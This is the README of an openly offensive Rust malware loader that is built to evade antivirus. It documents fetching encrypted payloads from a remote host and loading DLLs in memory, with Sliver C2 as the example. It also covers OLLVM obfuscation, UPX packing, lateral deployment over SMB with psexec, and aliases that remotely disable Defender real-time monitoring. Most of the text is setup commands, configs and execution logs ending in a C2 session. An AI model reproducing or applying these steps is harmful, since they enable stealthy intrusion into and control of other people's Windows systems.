# Malleable rust loader

![Malleable rust loader](banner.png?raw=true "Malleable rust loader")

```
malléable : adjectif
    1.
    Qui a la propriété de s'aplatir et de s'étendre en lames, en feuilles.
    L'or est le plus malléable des métaux.
```
## Table of Contents

- [Introduction](#introduction)
- [Features](#features)
  - [Config](#config)
  - [Payloads](#payloads)
  - [Compilation](#Compilation)
  - [Link](#Link)
  - [DataOperation](#DataOperation)
- [Design](#design)
  - [Exec steps explanation](#exec-steps-explanation)
  - [Execution workflow](#Execution-workflow)
  - [Config example](#Config-example)
- [How to use it](#How-to-use-it)
  - [1. Installation](#1-Installation)
    - [First steps](#First-steps)
    - [.bashrc addition](#bashrc-addition)
    - [debug logs](#debug-logs)
    - [OLLVM compilation (optionnal)](#OLLVM-compilation-optionnal)
  - [2. Encrypt payload (optionnal)](#2-encrypt-payload-optionnal)
  - [3. Create config file](#3-Create-config-file)
  - [4. Compile loader](#4-Compile-loader)
    - [4.1 linux compilation](#41-linux-compilation)
    - [4.2 windows debug compilation with logs](#42-windows-debug-compilation-with-logs)
    - [4.3 windows release compilation](#43-windows-release-compilation)
    - [4.4 windows OLLVM release compilation](#44-windows-OLLVM-release-compilation)
    - [4.5 windows compilation with payload in memory](#45-windows-compilation-with-payload-in-memory)
  - [5. Deploy config and payload](#5-Deploy-config-and-payload)
- [Side scripts](#Side-scripts)
  - [Winrust](#Winrust)
  - [reduced size and PACK with UPX](#reduced-size-and-PACK-with-UPX)
- [Roadmap](#Roadmap)
- [Credits and Thanks](#Credits-and-Thanks)
- [Licence](#Licence)

---

## Introduction

The objectiv of the Malleable rust loader is to load various payload (DLL from memory, Exe, etc...) in a way to evade static analysis of Antivirus. It can fetch data from various methods and perform multiple data operation to deobfuscate or decrypt payloads and new configuration.

Loader behavior is define by a config file and is higly customisable. At first the loader include initial config file and just before doing anything, there is mecanisms to update the config by a new one.

Every config file are also sign with elliptics curbs to trust them, this allow to store them in a non fully trust place and allow to disseminate backup way to keep control of your running loader.

Various way to retreive data for exec payload and reload configs are regrouped in the Link object, this allow to retreive data with network protocol HTTP, DNS(todo), WebSocket(todo), from file in the system or heaven from the loader Memory  by including stuff at compile time.

In addition, there is mechanism to modify to collected data retreive from a Link, its come from a list of define DataOperation to retreive the original data. (encrypted DLL, BASE64+ROT13 config file)

Moreover, some defuse action could be define before reloading config or executing payload (internet connectivity, specific domain join, or expected hostname)

LLVM Obfuscator (OLLVM) compilation options + string encryption are also include to avoid static analysis.


# Features

### Config

- [x] Include an encrypted first config generated from a json file
- [x] Reload new config at runtime with Link
- [x] Verify config with Ed25519 elliptic-curv

### Payloads

- [x] **Banner** : Display the awesome project banner 
- [x] **DownloadAndExec** : allow you to exec something else from disk, could be used to replace the Loader by a new version
- [x] **DllFromMemory** : The Star feature, allow you to run a DLL from Memory with module memorymodule-rs wish is apure rust adaptation of fancycode/MemoryModule (https://github.com/fancycode/MemoryModule)
- [x] **ExecPython** : Allow to exec python code, in conjonction with the Pyramid project of Naksyn, this allow to run exe from memory with a commandline.


### Compilation

- [X] cross compilation from linux
- [X] Windows oriented loader but support also Linux.
- [X] OLLVM obfuscation
- [X] Winrust side script to easily cross compil and test against a Windows.


### Link

Fetch data with various methods, du to loader config structure, its easy to add a new Link type.

- [x] HTTP
- [x] FILE
- [ ] Websocket (todo, ez)
- [ ] DNS (todo, hard), the plan is to use the DNSCAT protocol
- [x] MEMORY -> this permit to create a packer

### DataOperation

The way to modify fetch data from link

- [x] BASE64
- [x] ROT13
- [x] REVERSE
- [x] WEBPAGE -> allow to put the data somewhere into HTML
- [x] AEAD

# Design

## Exec steps explanation

The loader when running:
1. Decrypt the first config file from memory
2. Verify if defuse conditions to reload config are met or stop exec
3. Reload its configuration by downloading a new one from first Link (various protocol)
4. De-obfuscate collected configuration data
5. Verify the new configuration with elliptic-curv Ed25519
6. Eventually replace the Loader configuration if it found a new valid one, or try to fetch an other valid config Link
7. Verify if exec defuse conditions are met before next steps
8. Run the defined payloads !

## Execution workflow

TODO: IMAGE

## Config example

Here, this is the first line of the config file the first update link is stored in a HTML page : **gobelin.html** and the second one in **troll.html**.
Then the payload to run is a **DllFromMemory**, (here Sliver C2). As you see, the DLL is encrypted+sign with dataoperation:AEAD.

```
{
  "loaderconf_update_links": [
    {
      "HTTP": {
        "url": "https://kaboum.xyz/artdonjon/gobelin.html",
        "dataoperation": [
          "WEBPAGE",
          "BASE64"
        ],
        "sleep": 0,
        "jitt": 0
      }
    },
    {
      "HTTP": {
        "url": "https://kaboum.xyz/artdonjon/troll.html",
        "dataoperation": [
          "WEBPAGE",
          "BASE64"
        ],
        "sleep": 0,
        "jitt": 0
      }
    }
  ],
  "payloads": [
    {
      "DllFromMemory": {
        "link": {
          "HTTP": {
            "url": "https://kaboum.xyz/artdonjon/donjon_dll.jpg",
            "dataoperation": [
              {
                "AEAD": {
                  "key_bytes": [
                    13,
                    48,
                    30,
                    236,
                    11,
                    235,

[...]
```

This is the last part of the config,
Here, before reloading any configuration, the loader try to fetch Internet (microsoft.com or microsoftonline.com). After that, he verify both hostname or domain join name before running any payload.

At the end, you can see the elliptic-curv Ed25519 material. The config is signed with a private key present in the compil host.

```
  "defuse_update": [
    {
      "CheckInternet": {
        "list": [
          "https://www.microsoft.com",
          "https://login.microsoftonline.com"
        ],
        "operator": "AND"
      }
    }
  ],
  "defuse_payload": [
    {
      "Hostname": {
        "list": [
          "DEBUG-PC",
        ],
        "operator": "OR"
      }
    },
    {
      "DomainJoin": {
        "list": [
          "sevenkingdoms.local",
          "essos.local"
        ],
        "operator": "AND"
      }
    }
  ],
  "sign_material": {
    "peer_public_key_bytes": [
      119,
      106,
      243,
      236,
      26
[...]
    ],
    "sign_bytes": [
      166,
      179,
      27,
      207,
[...]
```



# How to use it

## 1. Installation

### First steps

Here you will :
- Generate a private Ed25519 key pair, this is you sign material
- install ~/.malleable/ working directory
- install windows rust tools chain

Run this:

```
cargo run --bin initmasterkey
rustup target add x86_64-pc-windows-gnu
```

### .bashrc addition

This line should be added to you bashrc for compilation output and string encryption :
```
export RUST_LOG=info
min=200
max=300
lit=$(python -c "import random; print(random.randint($min,$max))")
export LITCRYPT_ENCRYPT_KEY=$(tr -dc A-Za-z0-9 </dev/urandom | head -c $lit; echo)
```

You should also add a winrust alias to use it easily.

### debug logs

If you want to use the log/debug option, you should set global env variable for system and user in the Windows host:

```
setx RUST_LOG info /m
setx RUST_LOG info
```

After that, you can now use the params: `winrust --log, --debug` , to have a nice output.

### OLLVM compilation (optionnal)

This part is optionnal.

Thanks to this awesome project: https://github.com/joaovarelas/Obfuscator-LLVM-16.0
You should follow the instruction to install it, (its docker its ez !)


## 2. Encrypt payload (optionnal)

Here, you will generate encrypted payloads with AEAD. This is optionnal, you can use paylaod not encrypted or only test with the Banner Payload at first. Because you should know the payload decryption key and auth flag, you should create it before the config.

Example for a sliver.dll :

```
cargo run --bin encrypt_payload ~/.malleable/payload/sliver.dll
```

## 3. Create config file

Here you will generate a config file, sign it and prepare the file to become the initial config loader.

conf.rs is designed to create Working json config file and sign it automatically.
By default, the conf.rs script try to fetch key to decrypt dll here: `.malleable/payload/sliver.dll.dataop` , modifying it for simplicity: 

```
cargo run --bin conf dll
```

If you modify a json config by hand, you should sign it againg.

```
cargo run --bin sign /home/user/.malleable/config/initial.json
```

## 4. Compile loader

Here you will compile the loader with the initial config file.

- This config initial config `~/.malleable/config/initial.json` when you sign it.
- encrypted+obfsuscated initial config is store in `~/.malleable/config/initial.json.aead` when you sign it/
- And this file contains decrypt key + all dataoperation to decrypt the initial config : `~/.malleable/config/initial.json.aead.dataop.rot13b64`

### 4.1 linux compilation

```
cargo run --bin loader
```

### 4.2 windows debug compilation with logs

```
cargo rustc --target x86_64-pc-windows-gnu --bin loader --features logdebug
```

or with **winrust.py** (recommended)

```
winrust loader --debug
```

### 4.3 windows release compilation

```
cargo build --target x86_64-pc-windows-gnu --bin loader --release
```

or with **winrust.py** (recommended)

```
winrust loader --release
```


### 4.4 windows OLLVM release compilation


The OLLVM compilation should be reserved for release build.

This oneliner use approximately 4go of RAM (to confirm):

```
sudo docker run -v $(pwd):/projects/ -e LITCRYPT_ENCRYPT_KEY="$LITCRYPT_ENCRYPT_KEY" -it ghcr.io/joaovarelas/obfuscator-llvm-16.0 cargo rustc --bin loader --features ollvm  --target x86_64-pc-windows-gnu --release -- -Cdebuginfo=0 -Cstrip=symbols -Cpanic=abort -Copt-level=3 -Cllvm-args='-enable-acdobf -enable-antihook -enable-adb -enable-bcfobf -enable-cffobf -enable-splitobf -enable-subobf -enable-fco -enable-strcry -enable-constenc'
```

Depending of the compilation options you choose, you should monitor your RAM consumption because this increase too much and stop/freeze your computer when reaching the maximum you have.
Because of that, some compilation flag are not includ by default in winrust

You can also do that with winrust:

```
winrust loader --ollvm
```

### 4.5 windows compilation with payload in memory

This part show you how to include memory into the loader at compile time.
You can create a demo config with :

```
cargo run --bin conf memdll
```

As you see, the memory number choosen is precise by memory_nb parameter :

```
  "payloads": [
    {
      "DllFromMemory": {
        "link": {
          "MEMORY": {
            "memory_nb": 1,
            "dataoperation": [
              {
                "AEAD": {
```

Then, you should compile the code with the `--features mem1` compilation option

```
cargo build --target x86_64-pc-windows-gnu --bin "loader" --features mem1
```

Or with winrust, you should use the `--mem1` option:

```
winrust loader --debug --mem1
```

## 5. Deploy config and payload

This part is up to you.
you should deploy config file and payload manually.
It's not part of the project today. Wait next release 2.0 for this.

For example, with the previous config you should put a first reload config here :
https://kaboum.xyz/artdonjon/gobelin.html and an encrypted DLL here : https://kaboum.xyz/artdonjon/donjon_dll.jpg



# Side scripts

This part define side script and commands to help you 

##  Winrust

`winrust.py`, is a script to that could help you to easily:
- cross-compile from linux to Windows
- deploy exe with SMB into a Windows host
- and run it with psexec.py (or other impacket lateral movement script)

Moreover, this script help you for debugging by adding output, perform OLLVM compilation and add payload memory in the laoder at compile time.

```
└─$ winrust --help
usage: winrust [-h] [--mem1] [--mem2] [--mem3] [--mem4] [-exec_target EXEC_TARGET] [-exec_method EXEC_METHOD] [--ollvm]
               [--release] [--log] [--verbose]
               bin

Tools to help from Linux to compile rust code Windows and then exec it into a Windows host by uploading with SMB + use some some
impacket LateralMovement techniques

positional arguments:
  bin                   target bin

options:
  -h, --help            show this help message and exit
  --mem1                add a file in MEMORY_1 at compilation time, file should be located here: ~/.malleable/config/mem1
  --mem2                add a file in MEMORY_2 at compilation time, file should be located here: ~/.malleable/config/mem2
  --mem3                add a file in MEMORY_3 at compilation time, file should be located here: ~/.malleable/config/mem3
  --mem4                add a file in MEMORY_4 at compilation time, file should be located here: ~/.malleable/config/mem4
  -exec_target EXEC_TARGET
                        [[domain/]username[:password]@]<targetName or address>, by default use the content of ~/.exec
  -exec_method EXEC_METHOD
                        Method to execute on the Windows side, default psexec.py
  --ollvm               OLLVM obfuscation, add the release flag automatically
  --release             activate the cargo release mode for compilation, sinon its debug
  --log, --debug        activate the agent debug log into STDOUT, you should also activate rust loggin via env variable: setx
                        RUST_LOG info /m + setx RUST_LOG info
  --verbose, -v         verbose execution

by Brother
```

-> be carefull, **psexec.py** is catch by Antivirus Defender but have the advantage of sending live output during execution wish is very important to debug.
if you want to test against an Defender, you can switch to **atexex.py**, you will have output but at the end of the execution.


example of winrust usage (you should add the --debug option to have output for debugging) :

```
┌──(user㉿DRACONYS)-[~/malleable-rust-loader]
└─$ winrust loader --debug
2024-11-13 08:10:15,909 INFO	[+] NORMAL Compilation
2024-11-13 08:10:15,909 INFO	cargo build --target x86_64-pc-windows-gnu --bin "loader"  --features logdebug 
    Finished `dev` profile [unoptimized + debuginfo] target(s) in 0.19s
2024-11-13 08:10:16,153 INFO	[+] compilation succeed
2024-11-13 08:10:16,160 INFO	-rwxrwxr-x 2 user user 113M Nov 13 08:07 target/x86_64-pc-windows-gnu/debug/loader.exe
2024-11-13 08:10:16,170 INFO	target/x86_64-pc-windows-gnu/debug/loader.exe: PE32+ executable (console) x86-64, for MS Windows, 24 sections
2024-11-13 08:10:16,475 INFO	a662eb2c547ed9b9050ec57f7af4132261d4b855f32bdcbcc4484e8fb2df5ef6  target/x86_64-pc-windows-gnu/debug/loader.exe
2024-11-13 08:10:16,627 INFO	198652096989789263e405449e428e3c177cfbf9  target/x86_64-pc-windows-gnu/debug/loader.exe
2024-11-13 08:10:16,683 INFO	[+] upload file via SMB into target
Impacket v0.11.0 - Copyright 2023 Fortra

Type help for list of commands
# # # -rw-rw-rw-  117551412  Wed Nov 13 08:10:19 2024 loader-c00219d5113940bfb537ffb24db777b3.exe
# 2024-11-13 08:10:19,906 INFO	[+] exec c:\loader-c00219d5113940bfb537ffb24db777b3.exe with psexec.py
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Requesting shares on 192.168.56.23.....
[*] Found writable share ADMIN$
[*] Uploading file vHqTQByx.exe
[*] Opening SVCManager on 192.168.56.23.....
[*] Creating service fERt on 192.168.56.23.....
[*] Starting service fERt.....
[!] Press help for extra shell commands
[2024-11-13T07:10:20Z INFO  loader] [+] DECRYPT initial config
[2024-11-13T07:10:20Z INFO  loader] [+] DECRYPTED!
[2024-11-13T07:10:20Z INFO  loader] [+] VERIFY initial config
[2024-11-13T07:10:20Z INFO  loader] [+] VERIFIED!
    
[2024-11-13T07:10:20Z INFO  loader] [+] BEGIN LOOP 1 --------------------------------------------------------
list: ["DEBUG-W10"], operator: OR }), DomainJoin(DomainJoin { list: ["sevenkingdoms.local", "essos.local"], operator: AND })], sign_material: SignMaterial { peer_public_key_bytes: [112, 194, 204, 237, 240, 179, 23, 52, 29, 200, 231, 54, 135, 93, 42, 235, 33, 229, 186, 79, 214, 25, 90, 188, 100, 202, 160, 18, 211, 143, 90, 18], sign_bytes: [202, 177, 192, 91, 55, 252, 77, 88, 46, 133, 18, 112, 170, 14, 35, 198, 103, 242, 155, 109, 176, 215, 83, 56, 87, 4, 215, 134, 54, 174, 116, 205, 232, 139, 143, 233, 229, 119, 59, 185, 107, 179, 101, 244, 157, 41, 96, 189, 204, 209, 225, 34, 137, 61, 183, 109, 144, 156, 195, 35, 204, 167, 88, 12] }, sleep: 1, jitt: 1 }
[2024-11-13T07:10:20Z INFO  malleable_rust_loader::loaderconf] sleep: 1.4779852741068524
[2024-11-13T07:10:22Z INFO  loader] [+] DEFUSE RELOAD config
[2024-11-13T07:10:22Z INFO  malleable_rust_loader::loaderconf] 1/1 defuse: CheckInternet(CheckInternet { list: ["https://www.microsoft.com", "https://google.com", "https://login.microsoftonline.com"], operator: AND })
[2024-11-13T07:10:22Z INFO  malleable_rust_loader::link] sleep: 1.6500650048148768
[2024-11-13T07:10:24Z INFO  loader] [+] RELOAD config
[2024-11-13T07:10:24Z INFO  loader] 1/2 config link: HTTP(HTTPLink { url: "https://kaboum.xyz/artdonjon/gobelin.html", dataoperation: [WEBPAGE, BASE64], sleep: 0, jitt: 0 })
[2024-11-13T07:10:24Z INFO  malleable_rust_loader::link] sleep: 0
[2024-11-13T07:10:24Z INFO  loader] verify signature: true
[2024-11-13T07:10:24Z INFO  loader] same loader: true
[2024-11-13T07:10:24Z INFO  loader] [+] DECISION: keep the same active LOADER, and run the payloads
[2024-11-13T07:10:24Z INFO  loader] [+] DEFUSE payload exec
[2024-11-13T07:10:24Z INFO  malleable_rust_loader::loaderconf] 1/2 defuse: Hostname(Hostname { list: ["DEBUG-W10"], operator: OR })
[2024-11-13T07:10:24Z INFO  malleable_rust_loader::loaderconf] 2/2 defuse: DomainJoin(DomainJoin { list: ["sevenkingdoms.local", "essos.local"], operator: AND })
[2024-11-13T07:10:24Z INFO  loader] [+] PAYLOADS exec
[2024-11-13T07:10:24Z INFO  malleable_rust_loader::loaderconf] 1/1 payload: DllFromMemory(DllFromMemory { link: HTTP(HTTPLink { url: "https://kaboum.xyz/artdonjon/donjon_dll.jpg", dataoperation: [AEAD(AeadMaterial { key_bytes: [100, 7, 159, 177, 160, 143, 247, 73, 181, 159, 214, 81, 14, 49, 140, 153, 172, 173, 53, 223, 224, 148, 237, 97, 223, 41, 6, 110, 8, 112, 20, 233], associated_data: [], nonce: 751301581, tag: [105, 138, 234, 91, 135, 162, 172, 126, 187, 13, 130, 83, 80, 91, 3, 137] })], sleep: 0, jitt: 0 }), dll_entrypoint: "DllInstall" })
[2024-11-13T07:10:24Z INFO  malleable_rust_loader::link] sleep: 0
[2024-11-13T07:10:25Z WARN  malleable_rust_loader::payload] Map DLL in memory
[2024-11-13T07:10:25Z WARN  malleable_rust_loader::payload] Retreive DLL entrypoint: DllInstall
[2024-11-13T07:10:25Z WARN  malleable_rust_loader::payload] dll_entry_point()
```

And we got a session in Sliver !

![Sliver session](sliver_session.png?raw=true "Kaboum!")


## Stop Antivirus

You could stop antivirus to debug with psexec.py and reactivate it with this commandline:

```
alias avup="wmiexec.py -shell-type powershell $(cat ~/.exec) 'Set-MpPreference -DisableRealtimeMonitoring \$false'"
alias avdown="wmiexec.py -shell-type powershell $(cat ~/.exec) 'Set-MpPreference -DisableRealtimeMonitoring \$true'"
```

## reduced size and PACK with UPX

```
sudo upx -9 -v --ultra-brute  target/x86_64-pc-windows-gnu/release/loader.exe
```


# Roadmap


- infra as code to deploy or redeploy config and payload stage -> v2.0
- more payload
- more Link to fetch data : DNS + WebSocket
- More way to defeat static analysis -> tricks are welcome!
- The --bin check just to verify configuration file before sign
- Network redirector to modify the traffic behavior of an implant (listen 127.0.0.1 -> redirect to C2)
- collect data and send to C2 with a special payload : TODO
- find a way to sends logs into a C2, could be nice for error
- persistence payloads
- stegano for DataOperation, hide config and payload into nice harmless pictures

# Credits and Thanks

- Thanks to Victor P. for is perfect knowledge of Rust.
- Thanks to this awesome dockerisation of the OLLVM project https://github.com/joaovarelas/Obfuscator-LLVM-16.0 . https://vrls.ws/posts/2023/06/obfuscating-rust-binaries-using-llvm-obfuscator-ollvm/
- Thanks to https://github.com/fancycode/MemoryModule and [memorymodule-rs](https://lib.rs/crates/memorymodule-rs)
- Thanks to https://github.com/naksyn/Pyramid + https://github.com/naksyn/Embedder
- And thanks to the very nice Rust community helping me well !!


# Licence

 <p xmlns:cc="http://creativecommons.org/ns#" xmlns:dct="http://purl.org/dc/terms/"><a property="dct:title" rel="cc:attributionURL" href="https://github.com/Brother-x86/malleable-rust-loader">Malleable rust loader</a> by <a rel="cc:attributionURL dct:creator" property="cc:attributionName" href="https://avatars.githubusercontent.com/u/23420407?v=4">Brother-x86</a> is licensed under <a href="https://creativecommons.org/licenses/by/4.0/?ref=chooser-v1" target="_blank" rel="license noopener noreferrer" style="display:inline-block;">Creative Commons Attribution 4.0 International<img style="height:22px!important;margin-left:3px;vertical-align:text-bottom;" src="https://mirrors.creativecommons.org/presskit/icons/cc.svg?ref=chooser-v1" alt=""><img style="height:22px!important;margin-left:3px;vertical-align:text-bottom;" src="https://mirrors.creativecommons.org/presskit/icons/by.svg?ref=chooser-v1" alt=""></a></p> 